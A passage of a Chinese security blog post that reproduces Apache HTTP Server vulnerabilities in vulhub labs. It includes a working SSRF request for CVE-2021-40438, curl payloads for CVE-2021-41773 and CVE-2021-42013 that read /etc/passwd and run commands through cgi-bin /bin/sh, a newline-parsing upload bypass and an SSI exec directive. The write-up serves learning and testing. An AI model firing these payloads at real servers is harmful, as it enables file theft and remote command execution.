+<li>直接上传.php文件发现，会被拦截<br><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421151000922-1415403162.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421151000922-1415403162.png" alt="img"></a></li>
+<li>上传多后缀，成功上传<br><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421151039826-1026333669.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421151039826-1026333669.png" alt="img"></a></li>
+<li>.jpg文件解析成.php文件<br><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421151100616-1434949028.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421151100616-1434949028.png" alt="img"></a></li>
+</ul>
+<h3 id="Apache换行解析漏洞（CVE-2017-15715）"><a href="#Apache换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache换行解析漏洞（CVE-2017-15715）"></a>Apache换行解析漏洞（CVE-2017-15715）</h3><h4 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>apache的2.4.0~2.4.29<br>在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略<br>如果通过<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>获取文件名的话，会把\x0a自动去除</p>
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ul>
+<li>php文件上传失败<br><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421153516679-1438782817.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421153516679-1438782817.png" alt="img"></a></li>
+<li>加上0a进行<br><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421154547021-1887166871.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421154547021-1887166871.png" alt="img"></a></li>
+<li>可以解析php<br><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421154607369-89488801.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421154607369-89488801.png" alt="img"></a></li>
+</ul>
+<h3 id="Apache-HTTP-SSRF漏洞（CVE-2021-40438）"><a href="#Apache-HTTP-SSRF漏洞（CVE-2021-40438）" class="headerlink" title="Apache HTTP SSRF漏洞（CVE-2021-40438）"></a>Apache HTTP SSRF漏洞（CVE-2021-40438）</h3><h4 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>vulhub&#x2F;httpd&#x2F;CVE-2021-40438<br>docker-compose build<br>docker-compose up -d</p>
+<h4 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞。</p>
+<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/ HTTP/1.1</span><br><span class="line">Host: 192.168.1.162:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<h4 id="复现成功"><a href="#复现成功" class="headerlink" title="复现成功"></a>复现成功</h4><p><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421161408815-889286046.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421161408815-889286046.png" alt="img"></a></p>
+<h3 id="Apache-HTTP-路径穿越漏洞（CVE-2021-41773）"><a href="#Apache-HTTP-路径穿越漏洞（CVE-2021-41773）" class="headerlink" title="Apache HTTP 路径穿越漏洞（CVE-2021-41773）"></a>Apache HTTP 路径穿越漏洞（CVE-2021-41773）</h3><h4 id="漏洞搭建-1"><a href="#漏洞搭建-1" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>vulhub&#x2F;httpd&#x2F;CVE-2021-41773<br>docker-compose build<br>docker-compose up -d</p>
+<h4 id="漏洞介绍-3"><a href="#漏洞介绍-3" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
+<ul>
+<li>版本等于2.4.49</li>
+<li>穿越的目录允许被访问（默认情况下是不允许的）</li>
+</ul>
+<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令</p>
+<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用如下CURL命令来发送Payload（注意其中的<code>/icons/</code>必须是一个存在且可访问的目录）：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http:<span class="regexp">//</span>your-ip:<span class="number">8080</span>/icons/.%2e/%<span class="number">2</span>e%2e/%<span class="number">2</span>e%2e/%<span class="number">2</span>e%2e/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421162812843-2035353133.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421162812843-2035353133.png" alt="img"></a></p>
+<p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --<span class="keyword">data</span> <span class="string">&quot;echo;id&quot;</span> <span class="string">&#x27;http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421163702078-2012059004.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421163702078-2012059004.png" alt="img"></a></p>
+<p>└─# cat README.zh-cn.md</p>
+<h3 id="Apache-HTTP-路径穿越漏洞（CVE-2021-42013）"><a href="#Apache-HTTP-路径穿越漏洞（CVE-2021-42013）" class="headerlink" title="Apache HTTP 路径穿越漏洞（CVE-2021-42013）"></a>Apache HTTP 路径穿越漏洞（CVE-2021-42013）</h3><h4 id="漏洞搭建-2"><a href="#漏洞搭建-2" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>vulhub&#x2F;httpd&#x2F;CVE-2021-42013<br>docker-compose build<br>docker-compose up -d</p>
+<h4 id="漏洞介绍-4"><a href="#漏洞介绍-4" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><ul>
+<li>Apache官方在2.4.50版本中对2.4.49版本中出现的目录穿越漏洞CVE-2021-41773进行了修复，但这个修复是不完整的，CVE-2021-42013是对补丁的绕过。</li>
+<li>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令</li>
+<li>这个漏洞可以影响Apache HTTP Server 2.4.49以及2.4.50两个版本</li>
+</ul>
+<h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>但我们可以使用<code>.%%32%65</code>进行绕过（注意其中的<code>/icons/</code>必须是一个存在且可访问的目录）：</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --<span class="built_in">path</span>-as-is http://your-ip:<span class="number">8080</span>/icons/.<span class="variable">%%3</span>2<span class="variable">%65/.%</span><span class="variable">%32%</span><span class="number">65</span>/.<span class="variable">%%3</span>2<span class="variable">%65/.%</span><span class="variable">%32%</span><span class="number">65</span>/.<span class="variable">%%3</span>2<span class="variable">%65/.%</span><span class="variable">%32%</span><span class="number">65</span>/.<span class="variable">%%3</span>2%<span class="number">65</span>/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421203123324-1723115430.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421203123324-1723115430.png" alt="img"></a></p>
+<p>在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --data &quot;<span class="built_in">echo</span>;id&quot; &#x27;http://your-ip:<span class="number">8080</span>/cgi-bin/.<span class="variable">%%3</span>2<span class="variable">%65/.%</span><span class="variable">%32%</span><span class="number">65</span>/.<span class="variable">%%3</span>2<span class="variable">%65/.%</span><span class="variable">%32%</span><span class="number">65</span>/.<span class="variable">%%3</span>2<span class="variable">%65/.%</span><span class="variable">%32%</span><span class="number">65</span>/.<span class="variable">%%3</span>2%<span class="number">65</span>/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421203353176-430686126.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421203353176-430686126.png" alt="img"></a></p>
+<h3 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h3><h4 id="漏洞搭建-3"><a href="#漏洞搭建-3" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>vulhub&#x2F;httpd&#x2F;ssi-rce<br>docker-compose build<br>docker-compose up -d</p>
+<h4 id="漏洞介绍-5"><a href="#漏洞介绍-5" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p>
+<h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ul>
+<li>1<br><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421205118801-105819422.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421205118801-105819422.png" alt="img"></a></li>
+<li>2<br><a target="_blank" rel="noopener" href="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421205127151-718008146.png"><img src="https://img2022.cnblogs.com/blog/2791036/202204/2791036-20220421205127151-718008146.png" alt="img"></a></li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/5rem/p/16174460.html">https://www.cnblogs.com/5rem/p/16174460.html</a></p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://qwq0qwq.github.io/2024/02/12/java%E5%AE%89%E5%85%A8-apache/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://qwq0qwq.github.io/2024/02/12/java%E5%AE%89%E5%85%A8-apache/";
+            const title         = "「java安全-apache」";
+            const excerpt       = `java安全-apache什么是apacheApache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一
+单次web服务访问流程
+
+Ap...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-02-12T15:22:44.721Z" itemprop="dateModified">最后编辑：2024-02-12</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" java安全-tomcat" href="/2024/02/11/java安全-tomcat/">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/icon.jpg" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                13
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                0
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                2
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.8em;">java安全</a> <a href="/tags/java%E5%AE%89%E5%85%A8s/" style="font-size: 0.6em;">java安全s</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2024/02/12/java%E5%AE%89%E5%85%A8-apache/"><i class="fa  fa-book"></i> java安全-apache</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2024/02/11/java%E5%AE%89%E5%85%A8-tomcat/"><i class="fa  fa-book"></i> java安全-tomcat</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2024/02/10/java%E5%AE%89%E5%85%A8-log4j-log4j2/"><i class="fa  fa-book"></i> java安全-log4j_log4j2</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2024/02/10/java%E5%AE%89%E5%85%A8-redis/"><i class="fa  fa-book"></i> java安全-redis</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/10/11/Linux%E5%86%85%E6%A0%B8/"><i class="fa  fa-book"></i> Linux内核</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <!-- Keep for compatibility -->
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <!-- New links -->
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 QWQ0QWQ's blog 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by QWQ0QWQ.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://QwQ0QwQ.github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
